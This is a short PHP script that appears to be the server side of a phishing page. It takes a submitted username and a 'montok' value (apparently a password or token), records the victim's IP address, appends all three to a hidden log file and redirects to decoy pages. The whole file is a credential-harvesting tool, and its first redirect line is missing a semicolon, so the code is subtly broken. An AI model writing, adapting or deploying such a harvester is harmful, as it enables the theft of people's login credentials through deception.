<?php
header("location: redems.html")
header("location: index.html");
header("location: Redem.html");
$DEVx ="=====.jet";
$DEVy =$_POST['username'];
$DEVz =$_POST['montok'];
$ip =$_SERVER["REMOTE_ADDR"];

$handle=fopen($DEVx,'a');
fwrite($handle,"\n");
fwrite($handle, "key : ");
fwrite($handle,"$DEVy");
fwrite($handle,"\n");
fwrite($handle, "gey : ");
fwrite($handle,"$DEVz");
fwrite($handle,"\n");
fwrite($handle, "ip : ");
fwrite($handle,"$ip");
fwrite($handle,"\n");
fwrite($handle,"=============jet===============");

fclose($handle);
exit;

 ?>